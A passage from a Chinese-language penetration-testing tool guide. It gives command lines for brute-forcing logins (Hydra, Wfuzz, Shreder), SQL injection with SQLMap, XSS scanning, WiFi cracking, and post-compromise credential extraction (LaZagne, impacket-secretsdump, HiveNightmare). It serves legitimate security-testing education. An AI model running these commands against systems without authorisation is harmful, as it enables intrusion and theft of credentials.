+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment"># 使用 Crunch 生成 3 位十六进制密码</span><br><span class="hljs-attribute">crunch</span> <span class="hljs-number">3</span> <span class="hljs-number">3</span> <span class="hljs-number">0123456789</span>ABCDEF -o passwords.txt<br><br><span class="hljs-comment"># 使用 CeWL 根据网站内容生成字典</span><br><span class="hljs-attribute">cewl</span> -d <span class="hljs-number">2</span> -m <span class="hljs-number">5</span> -w passwords.txt http://example.com --with-numbers<br><br><span class="hljs-comment"># 或者提取团队页面的用户名</span><br><span class="hljs-attribute">cewl</span> -d <span class="hljs-number">0</span> -m <span class="hljs-number">5</span> -w usernames.txt http://example.com/team.php --lowercase<br></code></pre></div></td></tr></table></figure>
+
+<p>然后，例如使用 <strong>Wfuzz</strong> 进行凭据爆破：</p>
+<figure class="highlight cmake"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmake">wfuzz -c -z <span class="hljs-keyword">file</span>,usernames.txt -z <span class="hljs-keyword">file</span>,passwords.txt --hs <span class="hljs-string">&quot;Please enter the correct credentials&quot;</span> -u http://<span class="hljs-keyword">target</span>.com/login.php -d <span class="hljs-string">&quot;username=FUZZ&amp;password=FUZ2Z&quot;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>当然，我也会像其他人一样使用 <strong>thc-hydra</strong>  <a target="_blank" rel="noopener" href="https://github.com/epi052/feroxbuster%E8%BF%9B%E8%A1%8C%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%EF%BC%9A">https://github.com/epi052/feroxbuster进行暴力破解：</a></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># Web 表单爆破</span><br>hydra -L passwords.txt -P <span class="hljs-number">3</span>digits.txt -f -v <span class="hljs-keyword">http</span>://example.com/ <span class="hljs-keyword">http</span>-<span class="hljs-built_in">post</span>-form <span class="hljs-string">&quot;/login.php:pin=^PASS^:Access denied&quot;</span> -s <span class="hljs-number">8000</span><br><br><span class="hljs-comment"># SMB 服务爆破</span><br>hydra -L user.txt -P pass.txt IP_Address smb<br></code></pre></div></td></tr></table></figure>
+
+<hr>
+<p>**Feroxbuster **<a target="_blank" rel="noopener" href="https://github.com/epi052/feroxbuster%EF%BC%9A%E7%94%A8">https://github.com/epi052/feroxbuster：用</a> Rust 编写的快速、简单且支持递归的内容发现工具。它是强制浏览（Forced Browsing）的一种极佳替代方案。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-string">./feroxbuster</span> -u http:<span class="hljs-string">//example.com</span> -x pdf -x js,html -x php txt json,docx -s 200 301 302 <span class="hljs-params">--random-agent</span><br></code></pre></div></td></tr></table></figure>
+
+<p><strong>Dirsearch</strong> <a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch%EF%BC%9A%E9%9D%9E%E5%B8%B8%E9%85%B7%E7%9A%84">https://github.com/maurosoria/dirsearch：非常酷的</a> Web 路径扫描器。</p>
+<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> dirsearch.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> https://example.<span class="hljs-keyword">com</span><br><span class="hljs-keyword">python3</span> dirsearch.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">e</span> php,html,js -<span class="hljs-keyword">u</span> https://example.<span class="hljs-keyword">com</span><br><span class="hljs-keyword">python3</span> dirsearch.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">e</span> php,html,js -<span class="hljs-keyword">u</span> https://example.<span class="hljs-keyword">com</span> -<span class="hljs-keyword">w</span> /path/<span class="hljs-keyword">to</span>/wordlist<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>Gobuster</strong> <a target="_blank" rel="noopener" href="https://github.com/OJ/gobuster%EF%BC%9A%E5%90%8C%E6%A0%B7%E9%87%8D%E8%A6%81%EF%BC%8C%E5%AE%83%E6%98%AF%E7%94%A8">https://github.com/OJ/gobuster：同样重要，它是用</a> Go 编写的目录&#x2F;文件、DNS 和虚拟主机破解工具。</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># DNS 枚举</span><br>gobuster dns -d example.com -t <span class="hljs-number">50</span> -w common-names.txt<br><br><span class="hljs-comment"># 目录扫描（带 Cookie 和特定后缀）</span><br>gobuster dir -u <span class="hljs-keyword">https</span>://example.com/path/<span class="hljs-built_in">to</span>/<span class="hljs-built_in">folder</span> -c <span class="hljs-string">&#x27;session=123456&#x27;</span> -t <span class="hljs-number">50</span> -w common-<span class="hljs-built_in">files</span>.txt -x .php,.html<br><br><span class="hljs-comment"># 参数模糊测试</span><br>gobuster fuzz -u <span class="hljs-keyword">https</span>://example.com?FUZZ=test -w parameter-names.txt<br></code></pre></div></td></tr></table></figure>
+
+<hr>
+<h3 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h3><ul>
+<li><p>**cook **<a target="_blank" rel="noopener" href="https://github.com/glitchedgitz/cook%EF%BC%9A%E4%B8%80%E4%B8%AA%E5%AD%97%E5%85%B8%E7%AE%A1%E7%90%86%E6%A1%86%E6%9E%B6%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%AE%A9%E4%BD%A0%E5%AF%B9%E5%AD%97%E5%85%B8%E8%BF%9B%E8%A1%8C%E4%BB%BB%E4%BD%95%E6%83%B3%E8%A6%81%E7%9A%84%E6%93%8D%E4%BD%9C%E3%80%82%E7%94%B1%E4%BA%8E%E5%85%B6%E5%8A%9F%E8%83%BD%E6%9E%81%E5%85%B6%E5%A4%8D%E6%9D%82%EF%BC%8C%E5%BB%BA%E8%AE%AE%E9%98%85%E8%AF%BB%E5%AE%98%E6%96%B9%E4%BB%93%E5%BA%93%E4%BA%86%E8%A7%A3%E8%AF%A6%E6%83%85%E3%80%82">https://github.com/glitchedgitz/cook：一个字典管理框架，可以让你对字典进行任何想要的操作。由于其功能极其复杂，建议阅读官方仓库了解详情。</a></p>
+</li>
+<li><p>**DirDar **<a target="_blank" rel="noopener" href="https://github.com/M4DM0e/DirDar%EF%BC%9A%E5%80%BC%E5%BE%97%E4%B8%80%E8%AF%B4%E7%9A%84%E5%B7%A5%E5%85%B7%EF%BC%8C%E4%B8%93%E9%97%A8%E6%90%9C%E7%B4%A2">https://github.com/M4DM0e/DirDar：值得一说的工具，专门搜索</a> 403 Forbidden 目录并尝试绕过限制以获取目录列表。</p>
+</li>
+<li><p><strong>web-brutator</strong> <a target="_blank" rel="noopener" href="https://github.com/koutto/web-brutator%EF%BC%9A%E7%94%A8%E4%BA%8E">https://github.com/koutto/web-brutator：用于</a> Web 登录爆破，虽老旧但依然有效。已从 GitHub 安装在 <code>/opt</code> 目录下。</p>
+</li>
+<li><p><strong>Shreder</strong> <a target="_blank" rel="noopener" href="https://github.com/EntySec/Shreder%EF%BC%9A%E5%BC%BA%E5%A4%A7%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B">https://github.com/EntySec/Shreder：强大的多线程</a> SSH 协议密码爆破工具。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">shreder</span> <span class="hljs-number">192.168.1.100</span> -u username -l passwords.txt<br></code></pre></div></td></tr></table></figure>
+</li>
+<li><p><strong>Legba</strong> <a target="_blank" rel="noopener" href="https://github.com/evilsocket/legba%EF%BC%9A%E6%94%AF%E6%8C%81%E5%A4%9A%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%87%AD%E6%8D%AE%E7%88%86%E7%A0%B4/%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%E5%92%8C%E6%9E%9A%E4%B8%BE%E5%B7%A5%E5%85%B7%E3%80%82%E6%98%AF">https://github.com/evilsocket/legba：支持多协议的凭据爆破/密码喷洒和枚举工具。是</a> thc-hydra 的一个很酷的替代品。</p>
+</li>
+</ul>
+<h2 id="SQL-注入-SQLi"><a href="#SQL-注入-SQLi" class="headerlink" title="SQL 注入 (SQLi)"></a>SQL 注入 (SQLi)</h2><p>针对 SQL 注入，先获取一份带有参数的 URL 列表是非常值得的，你可以从 ZAP、Burp Suite 或其他爬虫工具中导出。</p>
+<p><strong>DSSS (Damn Small SQLi Scanner)</strong> <a target="_blank" rel="noopener" href="https://github.com/stamparm/DSSS%EF%BC%9A%E6%9E%81%E5%85%B6%E8%BD%BB%E9%87%8F%E7%BA%A7%E7%9A%84">https://github.com/stamparm/DSSS：极其轻量级的</a> SQLi 扫描器。已从 GitHub 安装在 <code>/opt</code> 目录下。</p>
+<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> dsss.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://example.com/index.php?parameter=1&quot;</span><br></code></pre></div></td></tr></table></figure>
+
+<p><strong>SQLMap</strong> <a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap%EF%BC%9A%E8%91%97%E5%90%8D%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96">https://github.com/sqlmapproject/sqlmap：著名的自动化</a> SQL 注入及数据库接管工具。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 基础探测：获取 Banner 信息</span><br>python3 sqlmap.py -u <span class="hljs-string">&quot;https://example.com/index.php?id=1&quot;</span> <span class="hljs-params">--batch</span> <span class="hljs-params">--banner</span><br><br><span class="hljs-comment"># 深度探测：指纹识别、获取 Banner、数据库名和用户列表</span><br>python3 sqlmap.py -u <span class="hljs-string">&quot;https://example.com/index.php?id=1&quot;</span> -f <span class="hljs-params">--banner</span> <span class="hljs-params">--dbs</span> <span class="hljs-params">--users</span><br><br><span class="hljs-comment"># 对文件列表中的多个 URL 进行批量扫描</span><br>python3 sqlmap.py -m list.txt <span class="hljs-params">--batch</span> <span class="hljs-params">--banner</span><br></code></pre></div></td></tr></table></figure>
+
+<p>你也可以直接利用 SQLMap 进行爬取：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">sqlmap -u <span class="hljs-string">&quot;http://example.com/&quot;</span> <span class="hljs-attribute">--crawl</span>=1 --random-agent --batch --forms <span class="hljs-attribute">--threads</span>=5 <span class="hljs-attribute">--level</span>=5 <span class="hljs-attribute">--risk</span>=3<br></code></pre></div></td></tr></table></figure>
+
+<ul>
+<li><strong>–batch</strong>：非交互模式，自动接受 SQLMap 的默认选项。</li>
+<li><strong>–crawl</strong>：指定爬取网站的深度。</li>
+<li><strong>–forms</strong>：解析并测试表单。</li>
+</ul>
+<p>**jSQL Injection **<a target="_blank" rel="noopener" href="https://github.com/ron190/jsql-injection%EF%BC%9A%E4%B8%80%E6%AC%BE%E7%94%A8%E4%BA%8E%E8%87%AA%E5%8A%A8%E5%8C%96">https://github.com/ron190/jsql-injection：一款用于自动化</a> SQL 注入的 Java 应用程序，提供图形界面（GUI）。已下载至 <code>/opt</code> 目录。</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span><span class="hljs-keyword">jsql-injection-v0.101.jar</span><br></code></pre></div></td></tr></table></figure>
+
+<p><strong>sqlscan</strong> <a target="_blank" rel="noopener" href="https://github.com/Cvar1984/sqlscan%EF%BC%9A%E5%BF%AB%E9%80%9F%E5%AF%BB%E6%89%BE">https://github.com/Cvar1984/sqlscan：快速寻找</a> SQL 注入点的 Web 扫描器。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">sqlscan http:<span class="hljs-string">//example.com</span> <span class="hljs-params">--scan</span><br></code></pre></div></td></tr></table></figure>
+
+<p>**ParamSpider **<a target="_blank" rel="noopener" href="https://github.com/devanshbatham/ParamSpider%EF%BC%9A%E4%BB%8E">https://github.com/devanshbatham/ParamSpider：从</a> Web 归档的隐藏角落挖掘 URL，用于漏洞猎取、模糊测试或深度探测。 虽然你可以通过 ZAP&#x2F;Burp 获取带参数的 URL 或复制 POST 请求，但 ParamSpider 在提取具有价值的 URL 方面表现非常出色。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-comment"># 针对单个域名</span><br><span class="hljs-attribute">paramspider</span> -d example.com<br><span class="hljs-comment"># 针对域名列表</span><br>paramspider -l domains.txt<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>Arjun</strong> <a target="_blank" rel="noopener" href="https://github.com/s0md3v/Arjun%EF%BC%9AHTTP">https://github.com/s0md3v/Arjun：HTTP</a> 参数发现套件，用于寻找隐藏的参数。</p>
+<figure class="highlight 1c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 1c">arjun <span class="hljs-punctuation">-</span>u https<span class="hljs-punctuation">:</span><span class="hljs-comment">//api.example.com/endpoint</span><br></code></pre></div></td></tr></table></figure>
+
+<h2 id="XSS-跨站脚本攻击"><a href="#XSS-跨站脚本攻击" class="headerlink" title="XSS (跨站脚本攻击)"></a>XSS (跨站脚本攻击)</h2><p>这些工具虽然不再活跃开发，但依然非常好用。XSS 漏洞历史悠久且至今仍能被探测到，从防御或攻击的角度来看，其实质几乎没有改变，因此这些工具依然具有参考价值。此外，ZAP 或 Burp Suite 也能探测到相同的问题。</p>
+<p><strong>Dalfox</strong> <a target="_blank" rel="noopener" href="https://github.com/hahwul/dalfox%EF%BC%9A%E4%B8%80%E6%AC%BE%E5%8A%9F%E8%83%BD%E5%BC%BA%E5%A4%A7%E7%9A%84%E5%BC%80%E6%BA%90">https://github.com/hahwul/dalfox：一款功能强大的开源</a> XSS 扫描器及工具，专注于自动化处理。</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 扫描单个 URL 并设置 OOB（带外）回调地址</span><br>dalfox url http://example.com/listproducts.php\?<span class="hljs-built_in">cat</span>\=123\&amp;artist\=123\&amp;asdf\=ff -b https://your-callback-url<br><br><span class="hljs-comment"># 从文件读取 URL 列表并使用自定义 Payload 字典</span><br>dalfox file urls_file --custom-payload ./mypayloads.txt<br></code></pre></div></td></tr></table></figure>
+
+<p>**XSStrike **<a target="_blank" rel="noopener" href="https://github.com/s0md3v/XSStrike%EF%BC%9A%E6%9C%80%E5%85%88%E8%BF%9B%E7%9A%84">https://github.com/s0md3v/XSStrike：最先进的</a> XSS 扫描器之一。已从 GitHub 安装在 <code>/opt</code> 目录下。</p>
+<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"># 针对特定参数进行扫描<br><span class="hljs-keyword">python</span> xsstrike.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://example.com/search.php?q=query&quot;</span><br># 爬取网站并搜寻 XSS 漏洞<br><span class="hljs-keyword">python</span> xsstrike.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&quot;http://example.com/page.php&quot;</span> --crawl<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>Traxss</strong> <a target="_blank" rel="noopener" href="https://github.com/M4cs/traxss%EF%BC%9A%E8%87%AA%E5%8A%A8%E5%8C%96">https://github.com/M4cs/traxss：自动化</a> XSS 漏洞扫描器。已从 GitHub 安装在 <code>/opt</code> 目录下的 Python 虚拟环境中。</p>
+<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> traxss.<span class="hljs-keyword">py</span><br></code></pre></div></td></tr></table></figure>
+
+<p>**XSpear **<a target="_blank" rel="noopener" href="https://github.com/hahwul/XSpear%EF%BC%9A%E5%BC%BA%E5%A4%A7%E7%9A%84">https://github.com/hahwul/XSpear：强大的</a> XSS 扫描与参数分析工具（Ruby Gem）。</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">xspear</span> -u <span class="hljs-string">&quot;http://example.com/listproducts.php?cat=123&quot;</span> -v <span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure>
+
+<p><strong>PwnXSS</strong> <a target="_blank" rel="noopener" href="https://github.com/pwn0sec/PwnXSS%EF%BC%9AXSS">https://github.com/pwn0sec/PwnXSS：XSS</a> 漏洞扫描及利用工具。已从 GitHub 安装在 <code>/opt</code> 目录下。</p>
+<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> pwnxss.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> http://example.<span class="hljs-keyword">com</span><br></code></pre></div></td></tr></table></figure>
+
+<hr>
+<h2 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h2><p>用于搜索开放转发（Open Relay）漏洞。</p>
+<p><strong>xSMTP</strong> <a target="_blank" rel="noopener" href="https://github.com/azizz98/xSMTP%EF%BC%9A%E6%9E%81%E9%80%9F%E3%80%81%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9A%84">https://github.com/azizz98/xSMTP：极速、多线程的</a> SMTP 扫描器，针对多个网段内的开放转发和未加密服务器。已从 GitHub 安装在 <code>/opt</code> 目录下。</p>
+<figure class="highlight node-repl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs node-repl">python3 xsmtp.py<br># 启动后按提示操作：<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-number">1</span></span><br>Enter a website url:<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">example.<span class="hljs-property">com</span></span><br></code></pre></div></td></tr></table></figure>
+
+<hr>
+<h3 id="WiFi-破解-WiFi-Cracking"><a href="#WiFi-破解-WiFi-Cracking" class="headerlink" title="WiFi 破解 (WiFi Cracking)"></a>WiFi 破解 (WiFi Cracking)</h3><p>因为有时候为了进入测试环境，你得先从物理网络层面下手。</p>
+<p><strong>WEF (Wi-Fi Exploitation Framework)</strong> <a target="_blank" rel="noopener" href="https://github.com/D3Ext/WEF%EF%BC%9AWiFi">https://github.com/D3Ext/WEF：WiFi</a> 利用框架。已从 GitHub 安装在 <code>/opt</code> 目录下。</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> wef -i wlan0<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>Bettercap</strong> <a target="_blank" rel="noopener" href="https://github.com/bettercap/bettercap%EF%BC%9A%E9%92%88%E5%AF%B9">https://github.com/bettercap/bettercap：针对</a> 802.11、蓝牙低功耗 (BLE)、IPv4 和 IPv6 网络侦察及中间人攻击（MITM）的瑞士军刀。这是一款带有 GUI 界面的工具。</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> bettercap -caplet http-ui<br></code></pre></div></td></tr></table></figure>
+
+<p><em>默认凭据位于：<code>/usr/local/share/bettercap/caplets/http-ui.cap</code></em></p>
+<p>**H4rpy **<a target="_blank" rel="noopener" href="https://github.com/MS-WEB-BN/h4rpy%EF%BC%9A%E8%87%AA%E5%8A%A8%E5%8C%96%E7%9A%84">https://github.com/MS-WEB-BN/h4rpy：自动化的</a> WPA&#x2F;WPA2 PSK 攻击工具。</p>
+<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ./h4rpy<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>Airgorah</strong> <a target="_blank" rel="noopener" href="https://github.com/martin-olivier/airgorah%EF%BC%9A%E4%B8%80%E6%AC%BE%E4%B8%BB%E8%A6%81%E5%9F%BA%E4%BA%8E">https://github.com/martin-olivier/airgorah：一款主要基于</a> aircrack-ng 工具集的 WiFi 安全审计软件。它是 GUI 应用程序，直接从菜单运行即可。</p>
+<p>此外，还可以关注一下 <strong>WiFiBroot <a target="_blank" rel="noopener" href="https://github.com/hash3liZer/WiFiBroot">https://github.com/hash3liZer/WiFiBroot</a></strong>。</p>
+<h2 id="受损机器-Compromised-Machine-内网"><a href="#受损机器-Compromised-Machine-内网" class="headerlink" title="受损机器 (Compromised Machine) 内网"></a>受损机器 (Compromised Machine) 内网</h2><p>一旦成功进入系统，我会使用以下工具获取有关环境和机器本身的更多信息，以便进一步开展渗透攻击！</p>
+<p><strong>Linux Smart Enumeration (LSE)</strong> <a target="_blank" rel="noopener" href="https://github.com/diego-treitos/linux-smart-enumeration%EF%BC%9A%E7%94%A8%E4%BA%8E%E5%9C%A8%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B8%AD%E5%AF%BB%E6%89%BE%E6%8F%90%E6%9D%83%E6%88%96%E5%88%A9%E7%94%A8%E7%9A%84%E5%8F%AF%E8%83%BD%E6%80%A7%E3%80%82">https://github.com/diego-treitos/linux-smart-enumeration：用于在操作系统中寻找提权或利用的可能性。</a></p>
+<figure class="highlight stata"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stata">wget <span class="hljs-string">&quot;https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh&quot;</span> -O lse.<span class="hljs-keyword">sh</span>; chmod 700 lse.<span class="hljs-keyword">sh</span><br>./lse.<span class="hljs-keyword">sh</span><br></code></pre></div></td></tr></table></figure>
+
+<p>此外，适用于 Linux 和 Windows 的还有 <strong>WinPEAS</strong> 和 <strong>LinPEAS</strong>。</p>
+<p><strong>LaZagne</strong> <a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne%EF%BC%9A%E5%87%AD%E6%8D%AE%E6%81%A2%E5%A4%8D%E5%B7%A5%E5%85%B7%EF%BC%88%E7%94%A8%E4%BA%8E%E4%BB%8E%E5%90%84%E7%A7%8D%E8%BD%AF%E4%BB%B6%E4%B8%AD%E6%8F%90%E5%8F%96%E5%AF%86%E7%A0%81%EF%BC%89%E3%80%82">https://github.com/AlessandroZ/LaZagne：凭据恢复工具（用于从各种软件中提取密码）。</a></p>
+<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">laZagne<span class="hljs-selector-class">.exe</span> <span class="hljs-attribute">all</span><br></code></pre></div></td></tr></table></figure>
+
+<p><strong>Seatbelt</strong> <a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt%EF%BC%9A%E4%BB%8E%E6%94%BB%E9%98%B2%E4%B8%A4%E7%AB%AF%E6%89%A7%E8%A1%8C%E4%B8%80%E7%B3%BB%E5%88%97%E9%9D%A2%E5%90%91%E5%AE%89%E5%85%A8%E7%9A%84%E5%90%84%E7%A7%8D%E4%B8%BB%E6%9C%BA%E6%99%AE%E6%9F%A5%E2%80%9C%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E2%80%9D%E3%80%82">https://github.com/GhostPack/Seatbelt：从攻防两端执行一系列面向安全的各种主机普查“安全检查”。</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sql">Seatbelt.exe <span class="hljs-operator">-</span><span class="hljs-keyword">group</span><span class="hljs-operator">=</span><span class="hljs-keyword">all</span> <span class="hljs-operator">-</span><span class="hljs-keyword">full</span><br></code></pre></div></td></tr></table></figure>
+
+<p><strong>linWinPwn</strong> <a target="_blank" rel="noopener" href="https://github.com/lefayjey/linWinPwn%EF%BC%9A%E4%B8%80%E4%B8%AA%E8%87%AA%E5%8A%A8%E5%8C%96%E8%B0%83%E7%94%A8%E5%A4%9A%E7%A7%8D">https://github.com/lefayjey/linWinPwn：一个自动化调用多种</a> Active Directory（活动目录）工具的 Bash 脚本。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">./linWinPwn<span class="hljs-selector-class">.sh</span> -t &lt;域控制器_IP&gt; <span class="hljs-attr">--auto</span> <span class="hljs-selector-attr">[-o &lt;输出目录&gt;]</span><br></code></pre></div></td></tr></table></figure>
+
+<p>**Impacket **<a target="_blank" rel="noopener" href="https://github.com/fortra/impacket%EF%BC%9A%E5%A4%84%E7%90%86%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E7%9A%84">https://github.com/fortra/impacket：处理网络协议的</a> Python 类集合。</p>
+<figure class="highlight autoit"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs autoit">impacket-secretsdump $domain/$user:$pass@$ip<br></code></pre></div></td></tr></table></figure>
+
+<p>**HiveNightmare **<a target="_blank" rel="noopener" href="https://github.com/GossiTheDog/HiveNightmare%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%EF%BC%8C%E5%85%81%E8%AE%B8%E9%9D%9E%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7%E5%9C%A8">https://github.com/GossiTheDog/HiveNightmare：漏洞利用工具，允许非管理员用户在</a> Windows 10 和 11 上读取注册表配置单元。</p>
